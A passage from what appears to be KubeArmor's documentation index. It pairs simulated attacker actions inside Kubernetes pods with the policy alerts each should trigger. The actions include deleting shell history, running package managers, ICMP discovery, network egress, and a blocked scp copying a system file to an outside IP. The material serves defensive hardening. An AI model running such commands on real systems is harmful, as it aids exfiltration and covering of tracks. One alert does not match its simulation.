\"548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"ContainerName\": \"wordpress\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"master-node\",\n  \"HostPID\": 72178,\n  \"HostPPID\": 30490,\n  \"Labels\": \"app=wordpress\",\n  \"Message\": \"Alert! remote file copy tools execution prevented.\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"wordpress\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 259,\n  \"PPID\": 193,\n  \"ParentProcessName\": \"/bin/bash\",\n  \"PodName\": \"wordpress-fb448db97-wj7n7\",\n  \"PolicyName\": \"harden-wordpress-remote-file-copy\",\n  \"ProcessName\": \"/usr/bin/scp\",\n  \"Resource\": \"/usr/bin/scp /etc/ca-certificates.conf 104.192.3.74:/mine/\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"5\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"MITRE,MITRE_TA0008_lateral_movement,MITRE_TA0010_exfiltration,MITRE_TA0006_credential_access,MITRE_T1552_unsecured_credentials,NIST_800-53_SI-4(18),NIST,NIST_800-53,NIST_800-53_SC-4\",\n  \"Timestamp\": 1696487496,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-05T06:31:36.085860Z\",\n  \"cluster_id\": \"2302\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/file-for/","title":"File for","text":""},{"location":"use-cases/res/file-for/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it mysql-74775b4bf4-mg7np -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-mg7np:/# cd /usr/bin\nroot@mysql-74775b4bf4-mg7np:/usr/bin# touch malicious-file\n</code></pre>"},{"location":"use-cases/res/file-for/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-m209\nNamespaceName: wordpress-mysql\nPodName: mysql-74775b4bf4-mg7np\nLabels: app=mysql\nContainerName: mysql\nContainerID: 6020fc7ad3489630e5d67b7a4615edefecc59cb1bbda826611c349a0a553ef60\nContainerImage: docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\nType: MatchedPolicy\nPolicyName: audit-for-system-paths\nSeverity: 5\nMessage: Access to network files detected. Possible violation of NIST Controls\nSource: /usr/bin/touch malicious-file\nResource: /etc/ld.so.cache\nOperation: File\nAction: Audit\nData: syscall=SYS_OPEN flags=O_RDONLY|O_CLOEXEC\nEnforcer: eBPF Monitor\nResult: Passed\nATags: [NIST PCI-DSS]\nHostPID: 2.562504e+06\nHostPPID: 2.56229e+06\nOwner: map[Name:mysql Namespace:wordpress-mysql Ref:Deployment]\nPID: 167\nPPID: 160\nParentProcessName: /bin/bash\nProcessName: /bin/touch\nTags: NIST,PCI-DSS\n</code></pre>"},{"location":"use-cases/res/fim-alert/","title":"Fim alert","text":""},{"location":"use-cases/res/fim-alert/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-65nqf:/# cd sbin\nroot@mysql-74775b4bf4-65nqf:/sbin# touch file\ntouch: cannot touch 'file': Permission denied\nroot@mysql-74775b4bf4-65nqf:/sbin# cd ..\n</code></pre>"},{"location":"use-cases/res/fim-alert/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": [\n    \"NIST\",\n    \"NIST_800-53_AU-2\",\n    \"NIST_800-53_SI-4\",\n    \"MITRE\",\n    \"MITRE_T1036_masquerading\",\n    \"MITRE_T1565_data_manipulation\"\n  ],\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4\",\n  \"ContainerImage\": \"docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\",\n  \"ContainerName\": \"mysql\",\n  \"Data\": \"syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"f0b220bfa3b7aeae754f3bf8a60dd1a0af001f5956ad22f625bdf83406a7fea3\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 16462,\n  \"HostPPID\": 16435,\n  \"Labels\": \"app=mysql\",\n  \"Message\": \"Detected and prevented compromise to File integrity\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"mysql\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 167,\n  \"PPID\": 160,\n  \"PodName\": \"mysql-74775b4bf4-65nqf\",\n  \"PolicyName\": \"harden-mysql-file-integrity-monitoring\",\n  \"ProcessName\": \"/bin/touch\",\n  \"Resource\": \"/sbin/file\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"1\",\n  \"Source\": \"/usr/bin/touch file\",\n  \"Tags\": \"NIST,NIST_800-53_AU-2,NIST_800-53_SI-4,MITRE,MITRE_T1036_masquerading,MITRE_T1565_data_manipulation\",\n  \"Timestamp\": 1696316210,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-10-03T06:56:50.829165Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/icmp-con/","title":"Managing ICMP Traffic for Enhanced Network Security","text":""},{"location":"use-cases/res/icmp-con/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# hping3 www.google.com\nUnable to resolve 'www.google.com'\nroot@nginx-77b4fdf86c-x7sdm:/# hping3 127.0.0.1\nWarning: Unable to guess the output interface\n[get_if_name] socket(AF_INET, SOCK_DGRAM, 0): Permission denied\n[main] no such device\nroot@nginx-77b4fdf86c-x7sdm:/# ping google.com\nPING google.com (216.58.200.206) 56(84) bytes of data.\n64 bytes from nrt12s12-in-f206.1e100.net (216.58.200.206): icmp_seq=1 ttl=109 time=51.9 ms\n64 bytes from nrt12s12-in-f206.1e100.net (216.58.200.206): icmp_seq=2 ttl=109 time=60.1 ms\n^C\n--- google.com ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1002ms\nrtt min/avg/max/mdev = 51.917/56.005/60.094/4.088 ms\n</code></pre>"},{"location":"use-cases/res/icmp-con/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 86904,\n  \"HostPPID\": 86860,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Network\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 1064,\n  \"PPID\": 1058,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/sbin/hping3\",\n  \"Resource\": \"domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/sbin/hping3 www.google.com\",\n  \"Timestamp\": 1696593032,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T11:50:32.098937Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/log-del/","title":"Log del","text":""},{"location":"use-cases/res/log-del/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# rm ~/.bash_history\nrm: cannot remove '/root/.bash_history': Permission denied\nroot@nginx-77b4fdf86c-x7sdm:/# rm ~/.bash_history\nrm: cannot remove '/root/.bash_history': Permission denied\n</code></pre>"},{"location":"use-cases/res/log-del/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_UNLINKAT flags=\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 43917,\n  \"HostPPID\": 43266,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 392,\n  \"PPID\": 379,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/rm\",\n  \"Resource\": \"/root/.bash_history\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/rm /root/.bash_history\",\n  \"Timestamp\": 1696577978,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T07:39:38.182538Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/net-acc/","title":"Net acc","text":""},{"location":"use-cases/res/net-acc/#simulation","title":"Simulation","text":"<p>Set the default security posture to default-deny</p> <pre><code>kubectl annotate ns default kubearmor-network-posture=block --overwrite\n</code></pre> <pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# curl www.google.com\ncurl: (6) Could not resolve host: www.google.com\nroot@nginx-77b4fdf86c-x7sdm:/# wget https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml\n--2023-10-06 11:08:58--  https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml\nResolving github.com (github.com)... 20.207.73.82\nConnecting to github.com (github.com)|20.207.73.82|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 15051 (15K) [text/plain]\nSaving to: 'wordpress-mysql-deployment.yaml.2'\n\nwordpress-mysql-deployment.ya 100%[=================================================&gt;]  14.70K  --.-KB/s    in 0.08s\n\n2023-10-06 11:08:59 (178 KB/s) - 'wordpress-mysql-deployment.yaml.2' saved [15051/15051]\n</code></pre>"},{"location":"use-cases/res/net-acc/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 73952,\n  \"HostPPID\": 73945,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Network\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 532,\n  \"PPID\": 525,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/curl\",\n  \"Resource\": \"domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/curl www.google.com\",\n  \"Timestamp\": 1696588301,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T10:31:41.935146Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/net-for/","title":"Net for","text":""},{"location":"use-cases/res/net-for/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it wordpress-7c966b5d85-wvtln -n wordpress-mysql -- bash\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# cd /etc/network/if-up.d\nroot@wordpress-7c966b5d85-wvtln:/etc/network/if-up.d# ls\nmountnfs\n</code></pre>"},{"location":"use-cases/res/net-for/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-8cn6\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-wvtln\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 6d09394a988c5cf6b9fe260d28fdd57d6ff281618869a173965ecd94a3efac44\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: ksp-nist-ac-18-1-network-audit\nSeverity: 3\nMessage: Access to network files detected. Possible violation of NIST Controls\nSource: /bin/ls\nResource: /etc/network/if-up.d\nOperation: File\nAction: Audit\nData: syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC\nEnforcer: eBPF Monitor\nResult: Passed\nATags: [NIST-800 AC-18(1) Networking Access NIST_SA NIST_SA-20 NIST_SA-20-Customized Development of Critical Components SA]\nHostPID: 1.275441e+06\nHostPPID: 1.275298e+06\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 342\nPPID: 336\nParentProcessName: /bin/bash\nProcessName: /bin/ls\nTags: NIST-800,AC-18(1),Networking,Access,NIST_SA,NIST_SA-20,NIST_SA-20-Customized Development of Critical Components,SA\n</code></pre>"},{"location":"use-cases/res/net-seg/","title":"Net seg","text":""},{"location":"use-cases/res/net-seg/#simulation","title":"Simulation","text":"<p>Before applying the policy all network connections to the mysql pod is permitted from other pods and the attacker can use ICMP for discovery</p> <pre><code>vagrant@master-node:\u2014$ kubectl exec -it wordpress-fb448db97-46rrn -n wordpress-mysql -- /bin/bash \nroot@wordpress-fb448db97-46rrn:/var/www/html# ping 10.0.0.10 \nPING 10.0.0.10 (10.0.0.10): 56 data bytes \n64 bytes from 10.0.0.10: icmp_seq=0 tt1=64 time=0.078 ms\n64 bytes from 10.0.0.10: icmp_seq=1 tt1=64 time=0.156 ms \n64 bytes from 10.0.0.10: icmp_seq=2 tt1=64 time=0.090 ms \n64 bytes from 10.0.0.10: icmp_seq=3 tt1=64 time=0.037 ms \n64 bytes from 10.0.0.10: icmp_seq=4 tt1=64 time=0.123 ms \n64 bytes from 10.0.0.10: icmp_seq=5 tt1=64 time=0.117 ms \n64 bytes from 10.0.0.10: icmp_seq=6 tt1=64 time=0.108 ms \n64 bytes from 10.0.0.10: icmp_seq=7 tt1=64 time=0.148 ms \n64 bytes from 10.0.0.10: icmp_seq=8 tt1=64 time=0.153 ms \n^C--- 10.0.0.10 ping statistics ---\n9 packets transmitted, 9 packets received, 0% packet loss \nround-trip min/avg/max/stddev = 0.037/0.112/0.156/0.037 ms \nroot@worderess-fb448db97-46rrn:/var/www/html# \n</code></pre> <p>After applying the policy, all other connections than the one defined will be dropped</p> <pre><code>vagrant@master-node:\u2014$ kubectl exec -it wordpress-fb448db97-42k66 -n wordpress-mysql -- /bin/bash \nroot@wordpress-fb448db97-42k6S:/var/www/html# ping 10.0.0.10 \nPING 10.0.0.10 (10.0.0.10): 56 data bytes \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n^C--- 10.0.0.10 ping statistics ---\n6 packets transmitted, 0 packets received, 100% packet loss \nroot@wordpress-fb448db97-42k66:/var/www/html# \nroot@wordpress-fb448db97-42k6S:/var/www/html# curl 10.0.0.10 \ncurl: (7) Failed to connect to 10.0.0.10 port 80: Connection refused \nroot@wordpress-fb448db97-42k6S:/var/www/html# \n</code></pre>"},{"location":"use-cases/res/pkg-tools/","title":"Pkg tools","text":""},{"location":"use-cases/res/pkg-tools/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-65nqf:/# apt\nbash: /usr/bin/apt: Permission denied\nroot@mysql-74775b4bf4-65nqf:/# apt-get\nbash: /usr/bin/apt-get: Permission denied\n</code></pre>"},{"location":"use-cases/res/pkg-tools/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": [\n    \"NIST\",\n    \"NIST_800-53_CM-7(4)\",\n    \"SI-4\",\n    \"process\",\n    \"NIST_800-53_SI-4\"\n  ],\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4\",\n  \"ContainerImage\": \"docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\",\n  \"ContainerName\": \"mysql\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"dd573c234f68b8df005e8cd314809c8b2a23852230d397743e348bf4a03ada3f\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 21894,\n  \"HostPPID\": 16435,\n  \"Labels\": \"app=mysql\",\n  \"Message\": \"Alert! Execution of package management process inside container is denied\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"mysql\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 168,\n  \"PPID\": 160,\n  \"PodName\": \"mysql-74775b4bf4-65nqf\",\n  \"PolicyName\": \"harden-mysql-pkg-mngr-exec\",\n  \"ProcessName\": \"/usr/bin/apt\",\n  \"Resource\": \"/usr/bin/apt\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"5\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4\",\n  \"Timestamp\": 1696318864,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-10-03T07:41:04.096412Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/proc-base-acc/","title":"Proc base acc","text":""},{"location":"use-cases/res/proc-base-acc/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# cd /etc/nginx/\nroot@nginx-77b4fdf86c-x7sdm:/etc/nginx# ls\nbash: /usr/bin/ls: Permission denied\nroot@nginx-77b4fdf86c-x7sdm:/etc/nginx#\n</code></pre>"},{"location":"use-cases/res/proc-base-acc/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"eBPF Monitor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 70701,\n  \"HostPPID\": 70666,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 444,\n  \"PPID\": 439,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/ls\",\n  \"Resource\": \"/usr/bin/ls\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/bash\",\n  \"Timestamp\": 1696587116,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T10:11:56.694009Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/proc-base-net/","title":"Proc base net","text":""},{"location":"use-cases/res/proc-base-net/#simulation","title":"Simulation","text":"<p>Set the default security posture to default-deny</p> <pre><code>kubectl annotate ns default kubearmor-network-posture=block --overwrite\n</code></pre> <pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# curl www.google.com\ncurl: (6) Could not resolve host: www.google.com\nroot@nginx-77b4fdf86c-x7sdm:/# wget https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml\n--2023-10-06 11:08:58--  https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml\nResolving github.com (github.com)... 20.207.73.82\nConnecting to github.com (github.com)|20.207.73.82|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 15051 (15K) [text/plain]\nSaving to: 'wordpress-mysql-deployment.yaml.2'\n\nwordpress-mysql-deployment.ya 100%[=================================================&gt;]  14.70K  --.-KB/s    in 0.08s\n\n2023-10-06 11:08:59 (178 KB/s) - 'wordpress-mysql-deployment.yaml.2' saved [15051/15051]\n</code></pre>"},{"location":"use-cases/res/proc-base-net/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 73952,\n  \"HostPPID\": 73945,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Network\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 532,\n  \"PPID\": 525,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/curl\",\n  \"Resource\": \"domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/curl www.google.com\",\n  \"Timestamp\": 1696588301,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T10:31:41.935146Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/proc-for/","title":"Proc for","text":""},{"location":"use-cases/res/proc-for/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it wordpress-7c966b5d85-wvtln -n wordpress-mysql -- bash\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# ps -A\n    PID TTY          TIME CMD\n      1 ?        00:00:08 apache2\n    189 ?        00:00:00 apache2\n    190 ?        00:00:00 apache2\n    191 ?        00:00:00 apache2\n    192 ?        00:00:00 apache2\n    193 ?        00:00:00 apache2\n    245 pts/0    00:00:00 bash\n</code></pre>"},{"location":"use-cases/res/proc-for/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-8cn6\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-wvtln\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 6d09394a988c5cf6b9fe260d28fdd57d6ff281618869a173965ecd94a3efac44\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: ksp-discovery-process-discovery\nSeverity: 5\nMessage: Someone accessed running process\nSource: /bin/bash\nResource: /bin/ps -A\nOperation: Process\nAction: Audit\nData: syscall=SYS_EXECVE\nEnforcer: eBPF Monitor\nResult: Passed\nATags: [MITRE Discovery]\nHostPID: 1.252488e+06\nHostPPID: 1.250979e+06\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 288\nPPID: 281\nParentProcessName: /bin/bash\nProcessName: /bin/ps\nTags: MITRE,Discovery\n</code></pre>"},{"location":"use-cases/res/proc-white/","title":"Proc white","text":""},{"location":"use-cases/res/proc-white/#simulation","title":"Simulation","text":"<p>Set the default security posture to default-deny</p> <pre><code>kubectl annotate ns default kubearmor-file-posture=block --overwrite\n</code></pre> <pre><code>kubectl exec -it dvwa-web-566855bc5b-xtgwq -- bash\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html# ping\nbash: /bin/ping: Permission denied\n</code></pre>"},{"location":"use-cases/res/proc-white/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"eBPF Monitor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 84245,\n  \"HostPPID\": 84127,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Network\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 1032,\n  \"PPID\": 1023,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/ping\",\n  \"Resource\": \"domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/ping www.google.com\",\n  \"Timestamp\": 1696591999,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T11:33:19.956684Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/res-cap/","title":"Res 